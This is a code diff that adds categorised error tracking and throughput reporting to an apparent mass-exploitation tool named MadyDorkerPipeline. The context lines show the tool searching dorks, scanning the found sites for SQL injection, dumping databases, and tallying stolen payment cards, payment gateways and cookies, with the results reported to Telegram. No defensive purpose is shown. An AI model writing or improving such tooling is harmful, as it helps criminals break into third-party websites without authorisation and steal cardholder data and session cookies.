@@ -71,6 +71,16 @@ logger.add(
     format="<green>{time:HH:mm:ss}</green> | <level>{level:<7}</level> | {message}",
 )
 logger.add("madydorker.log", rotation="10 MB", retention=3, level="DEBUG")
+# Dedicated error log — only WARNING+ with full tracebacks & context
+logger.add(
+    "madydorker_errors.log",
+    rotation="5 MB",
+    retention=5,
+    level="WARNING",
+    format="{time:YYYY-MM-DD HH:mm:ss.SSS} | {level:<8} | {name}:{function}:{line} | {message}",
+    backtrace=True,
+    diagnose=True,
+)
 
 # Telegram setup
 try:
@@ -564,6 +574,13 @@ class MadyDorkerPipeline:
         self.urls_scanned = 0
         self.start_time = None
 
+        # ── Advanced error tracking ──
+        self._error_counts: Dict[str, int] = {}  # category → count
+        self._error_samples: Dict[str, str] = {}  # category → last sample message
+        self._cycle_errors: int = 0               # errors in current cycle
+        self._total_errors: int = 0               # lifetime errors
+        self._last_error_time: Optional[str] = None
+
         # Concurrency controls
         self._url_semaphore = asyncio.Semaphore(self.config.concurrent_url_limit)
 
@@ -915,6 +932,39 @@ class MadyDorkerPipeline:
             return False
         content_hash = self._content_hash(content)
         return content_hash == fingerprint
+
+    def _track_error(self, category: str, msg: str, url: str = None):
+        """Track an error by category for cycle/lifetime summaries.
+
+        Categories: search, precheck, waf, sqli, dump, export, db, network, timeout, unknown
+        """
+        self._error_counts[category] = self._error_counts.get(category, 0) + 1
+        self._cycle_errors += 1
+        self._total_errors += 1
+        self._last_error_time = datetime.now().isoformat()
+        sample = f"{msg[:120]}"
+        if url:
+            sample = f"{url[:60]} → {msg[:100]}"
+        self._error_samples[category] = sample
+        logger.warning(f"[ERR:{category}] {sample}")
+
+    def _reset_cycle_errors(self):
+        """Reset per-cycle error counters (called at cycle start)."""
+        self._cycle_errors = 0
+        self._error_counts.clear()
+        self._error_samples.clear()
+
+    def _get_error_summary(self) -> str:
+        """Build a compact error summary string for cycle reports."""
+        if not self._error_counts:
+            return ""
+        parts = []
+        for cat in sorted(self._error_counts, key=self._error_counts.get, reverse=True):
+            cnt = self._error_counts[cat]
+            sample = self._error_samples.get(cat, "")
+            parts.append(f"  {cat}: {cnt}x — {sample[:80]}")
+        header = f"⚠️ <b>{self._cycle_errors} errors this cycle</b> ({self._total_errors} lifetime)"
+        return header + "\n" + "\n".join(parts[:8])  # Top 8 categories
 
     def _score_url_priority(self, url: str, waf_info=None) -> int:
         """Score URL for priority queue — higher = process first."""
@@ -2445,7 +2495,7 @@ class MadyDorkerPipeline:
                                                     except Exception as e:
                                                         logger.debug(f"storing blind dump results: {e}")
                         except Exception as e:
-                            logger.warning(f"SQLi scan failed for {url}: {e}")
+                            self._track_error("sqli", f"SQLi scan failed: {e}", url)
 
                     # Step 6: SQLi on crawler-discovered param URLs (v3.9)
                     if (
@@ -3025,12 +3075,14 @@ class MadyDorkerPipeline:
         except asyncio.TimeoutError:
             # Timeouts may be caused by slow local processing, not the domain being hostile.
             # Do NOT count as a domain failure (would trigger circuit breaker unfairly).
-            logger.warning(f"Timeout processing {url[:80]} — will retry next cycle")
+            self._track_error("timeout", f"Pipeline timeout: {url[:80]}", url)
         except aiohttp.ClientError as e:
-            logger.debug(f"Connection error for {url}: {e}")
+            self._track_error("network", f"Connection error: {e}", url)
             self.db.record_domain_failure(domain)
         except Exception as e:
-            logger.error(f"Pipeline error for {url}: {e}")
+            err_str = str(e).lower()
+            cat = "ssl" if "ssl" in err_str else "proxy" if "proxy" in err_str else "unknown"
+            self._track_error(cat, f"Pipeline error: {e}", url)
         finally:
             # Only mark URL/domain as processed if the pipeline actually completed.
             # This ensures failed/timed-out URLs remain eligible for retry.
@@ -3208,9 +3260,9 @@ class MadyDorkerPipeline:
                 async with aiohttp.ClientSession(timeout=_pre_timeout) as _s:
                     async with _s.head(url, allow_redirects=True, ssl=False, proxy=_proxy_url) as _r:
                         pass  # Just checking connectivity
-            except Exception:
+            except Exception as _pre_err:
                 # Site didn't respond to HEAD in 2s — skip it
-                logger.info(f"Pre-check failed (2s): {url[:60]}")
+                self._track_error("precheck", f"HEAD 2s timeout: {type(_pre_err).__name__}", url)
                 try:
                     domain = urlparse(url).netloc
                     self.db.record_url_failure(url, domain, "precheck_timeout_2s")
@@ -3301,24 +3353,45 @@ class MadyDorkerPipeline:
                         if filepath:
                             await self._send_export_file(filepath)
                     except Exception as e:
-                        logger.debug(f"Auto-export error: {e}")
+                        self._track_error("export", str(e), url)
         except asyncio.TimeoutError:
-            logger.warning(
-                f"URL processing timed out ({_timeout}s): {url[:60]}"
-            )
-            # Mark as failed so it counts toward max_url_retries
+            self._track_error("timeout", f"URL processing timed out ({_timeout}s)", url)
             try:
                 domain = urlparse(url).netloc
                 self.db.record_url_failure(url, domain, f"timeout_{_timeout}s")
             except Exception as e:
                 logger.debug(f"recording URL timeout failure: {e}")
-        except Exception as e:
-            logger.warning(f"URL processing error: {url[:60]} — {e}")
+        except asyncio.CancelledError:
+            raise  # Don't swallow cancellation
+        except ConnectionError as e:
+            self._track_error("network", f"Connection: {type(e).__name__}: {str(e)[:80]}", url)
             try:
                 domain = urlparse(url).netloc
-                self.db.record_url_failure(url, domain, str(e)[:200])
-            except Exception as e:
-                logger.debug(f"recording URL failure in DB: {e}")
+                self.db.record_url_failure(url, domain, f"conn_{type(e).__name__}")
+            except Exception:
+                pass
+        except Exception as e:
+            # Categorize the error
+            err_type = type(e).__name__
+            err_msg = str(e)[:150]
+            if "ssl" in err_msg.lower() or "certificate" in err_msg.lower():
+                cat = "ssl"
+            elif "timeout" in err_msg.lower() or "timed out" in err_msg.lower():
+                cat = "timeout"
+            elif "connect" in err_msg.lower() or "refused" in err_msg.lower():
+                cat = "network"
+            elif "proxy" in err_msg.lower():
+                cat = "proxy"
+            elif "encoding" in err_msg.lower() or "decode" in err_msg.lower():
+                cat = "encoding"
+            else:
+                cat = "unknown"
+            self._track_error(cat, f"{err_type}: {err_msg}", url)
+            try:
+                domain = urlparse(url).netloc
+                self.db.record_url_failure(url, domain, f"{cat}_{err_type}"[:200])
+            except Exception:
+                pass
 
     async def run_dork_cycle(self, dorks: List[str] = None, category: str = None):
         """Run one cycle of dorking + processing with concurrent URL scanning.
@@ -3338,6 +3411,7 @@ class MadyDorkerPipeline:
         """
         self.cycle_count += 1
         self.skip_cycle = False  # Reset skip flag for new cycle
+        self._reset_cycle_errors()  # Reset per-cycle error counters
         cycle_start_time = asyncio.get_event_loop().time()
         logger.info(f"=== CYCLE {self.cycle_count} STARTING ===")
 
@@ -3552,7 +3626,7 @@ class MadyDorkerPipeline:
             all_batch_urls = []
             for (global_idx, dork), raw_urls in zip(effective_batch, search_results):
                 if isinstance(raw_urls, Exception):
-                    logger.error(f"Dork search error: {raw_urls}")
+                    self._track_error("search", str(raw_urls)[:200])
                     continue
 
                 urls = raw_urls or []
@@ -3670,19 +3744,25 @@ class MadyDorkerPipeline:
         b3_count = len(self.db.get_b3_cookies()) if hasattr(self, "db") else 0
 
         cycle_elapsed = asyncio.get_event_loop().time() - cycle_start_time
+        _urls_per_min = cycle_urls_processed / max(cycle_elapsed / 60, 0.1)
         summary = (
             f"✅ <b>Cycle {self.cycle_count} Complete</b> ({cycle_elapsed / 60:.1f}m)\n"
-            f"Dorks: {len(cycle_dorks)}/{len(dorks)} | URLs processed: {cycle_urls_processed} | Hits: {len(cycle_findings)}\n"
+            f"Dorks: {len(cycle_dorks)}/{len(dorks)} | URLs processed: {cycle_urls_processed} ({_urls_per_min:.1f}/min) | Hits: {len(cycle_findings)}\n"
             f"Total scanned: {self.urls_scanned} | Gateways: {len(self.found_gateways)} | "
             f"SQLi: {len(self.vulnerable_urls)} | Cards: {len(self.found_cards)}\n"
             f"🍪 Cookies: {cookie_count} | 🔵 B3: {b3_count}"
         )
+        # Append error summary if any errors occurred
+        err_summary = self._get_error_summary()
+        if err_summary:
+            summary += f"\n\n{err_summary}"
         await self._send_progress(summary)
         logger.info(
             f"=== CYCLE {self.cycle_count} COMPLETE ({cycle_elapsed / 60:.1f}m) — "
-            f"{cycle_urls_processed} URLs processed, "
+            f"{cycle_urls_processed} URLs processed ({_urls_per_min:.1f}/min), "
             f"{len(self.found_gateways)} gateways, "
-            f"{len(self.vulnerable_urls)} SQLi vulns ==="
+            f"{len(self.vulnerable_urls)} SQLi vulns, "
+            f"{self._cycle_errors} errors ==="
         )
 
     async def start(self):
